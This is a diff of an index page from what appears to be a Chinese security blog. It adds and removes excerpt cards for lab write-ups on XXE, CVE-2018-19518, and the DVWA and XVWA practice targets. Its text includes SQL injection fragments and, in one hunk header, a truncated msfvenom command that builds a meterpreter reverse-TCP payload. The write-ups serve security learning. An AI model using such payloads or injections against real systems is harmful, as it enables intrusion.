@@ -182,6 +182,115 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%E7%8E%AF%E5%A2%83XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1(XXE)/" target="_self">
+          PHP环境XML外部实体注入防御(XXE)
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%E7%8E%AF%E5%A2%83XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1(XXE)/" target="_self">
+          
+          
+            
+          
+          PHP环境XML外部实体注入防御（XXE）环境介绍PHP 7.0.30libxml 2.8.0
+为了演示PHP环境下的XXE漏洞，本例将libxml2.8.0版本编译进PHP中。PHP 版本并不影响XXE利用。
+使用如下命令编译并启动环境：
+cd vulhub/php/php_xxe
+docker-compose up -d
+
+web目录如下
+$ tree .
+.
+├── dom.php # 示例
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-07-10 02:00" pubdate>
+              2021-07-10
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E4%BF%A1%E5%AE%89-%E5%A4%8D%E7%8E%B0/">信安 复现</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-19518)/" target="_self">
+          PHP 远程命令执行漏洞(CVE-2018-19518)
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-19518)/" target="_self">
+          
+          
+            
+          
+          PHP 远程命令执行漏洞（CVE-2018-19518）详细信息   在PHP和其他产品的imap_open（）中使用的UNIX上的华盛顿大学IMAP工具包2007f启动rsh命令（借助于c-client / imap4r1.c中的imap_rimap函数和osdep / unix / tcp_unix中的tcp_aopen函数.c），而不会阻止参数注入，如果IMAP服务器名称是不受信任的输入（例
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-07-10 01:59" pubdate>
+              2021-07-10
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E4%BF%A1%E5%AE%89-%E5%A4%8D%E7%8E%B0/">信安 复现</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/07/10/Git/GIT%20%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" target="_self">
           GIT 基本使用
         </a>
@@ -626,131 +735,11 @@ msfvenom -a x64 –platform linux  -p linux/x64/meterpreter/reverse_tcp  LHOST=1
     </article>
   </div>
 
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/07/06/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/XVWA%E7%BB%83%E4%B9%A0/" target="_self">
-          XVWA练习
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/07/06/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/XVWA%E7%BB%83%E4%B9%A0/" target="_self">
-          
-          
-            
-          
-          XVWA练习SQL Injection整体界面如下:
-
-在进行尝试之后发现，界面有两个查询点，首先是选择的code，其次是自由输入的查询。
-使用bp抓取选择code后的包，具体如图：
-
-item在对post的item内容尝试进行注入后，发现注入的类型是整型注入。之后查看回显字段个数。
-sql：1 order by *;#
-经过尝试回显是7，使用联合注入查看回显的位置。sql：0 union sel
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-07-06 17:25" pubdate>
-              2021-07-06
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E4%BF%A1%E5%AE%89-%E9%9D%B6%E6%9C%BA/">信安 靶机</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
-            
-              <a href="/tags/%E6%BC%8F%E6%B4%9Etop10/">漏洞top10</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/07/05/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/DVWA%E7%BB%83%E4%B9%A0/" target="_self">
-          DVWA练习
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/07/05/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/DVWA%E7%BB%83%E4%B9%A0/" target="_self">
-          
-          
-            
-          
-          DVWA靶机练习Brute Force暴力破解
-首先根据提示可以得知应该使用暴力破解，用户先尝试常用的admin,之后使用bp抓包
-
-之后使用常用字典进行暴力破解
-
-经过长度判断密码为password
-
-high模式由于有token检测，所以需要先访问界面获取token之后进行爆破
-需要编写程序获取内容后进行爆破。程序如下：
-123456789101112131415161718192021222
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-07-05 09:43" pubdate>
-              2021-07-05
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E4%BF%A1%E5%AE%89-%E9%9D%B6%E6%9C%BA/">信安 靶机</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
-            
-              <a href="/tags/%E6%BC%8F%E6%B4%9Etop10/">漏洞top10</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
 
 
   <nav aria-label="navigation">
     <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/page/6/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/#board">5</a><a class="page-number" href="/page/6/#board">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/#board">8</a><a class="page-number" href="/page/9/#board">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/#board">17</a><a class="extend next" rel="next" href="/page/8/#board"><i class="iconfont icon-arrowright"></i></a>
+      <a class="extend prev" rel="prev" href="/page/6/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/#board">5</a><a class="page-number" href="/page/6/#board">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/#board">8</a><a class="page-number" href="/page/9/#board">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/#board">18</a><a class="extend next" rel="next" href="/page/8/#board"><i class="iconfont icon-arrowright"></i></a>
     </span>
   </nav>
 
